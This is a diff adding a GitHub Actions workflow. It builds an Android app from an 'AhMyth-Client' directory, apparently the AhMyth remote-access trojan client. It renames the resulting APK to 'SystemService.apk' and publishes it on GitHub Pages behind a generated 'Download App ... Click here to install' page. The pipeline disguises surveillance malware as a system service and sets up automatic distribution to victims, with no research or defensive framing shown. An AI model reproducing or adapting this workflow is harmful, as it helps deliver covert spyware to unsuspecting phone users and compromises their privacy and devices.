@@ -1,0 +1,54 @@
+name: Build Android and Deploy Web
+
+on:
+  push:
+    branches: [ "main", "master" ]
+  workflow_dispatch:
+
+permissions:
+  contents: write
+  pages: write
+  id-token: write
+
+jobs:
+  build-and-deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+          cache: gradle
+
+      - name: Grant execute permission for gradlew
+        run: chmod +x AhMyth-Client/gradlew
+
+      - name: Build APK with Gradle
+        run: |
+          cd AhMyth-Client
+          ./gradlew assembleDebug -x lint
+
+      - name: Prepare Website Folder
+        run: |
+          mkdir -p _site
+          # Copy the built APK to the site folder
+          cp AhMyth-Client/app/build/outputs/apk/debug/app-debug.apk _site/SystemService.apk
+          # Copy the index.html (Create one if missing)
+          if [ -f docs/index.html ]; then
+            cp docs/index.html _site/index.html
+          else
+            echo "<html><body><h1>Download App</h1><a href='SystemService.apk'>Click here to install</a></body></html>" > _site/index.html
+          fi
+
+      - name: Upload Pages Artifact
+        uses: actions/upload-pages-artifact@v3
+        with:
+          path: '_site'
+
+      - name: Deploy to GitHub Pages
+        id: deployment
+        uses: actions/deploy-pages@v4
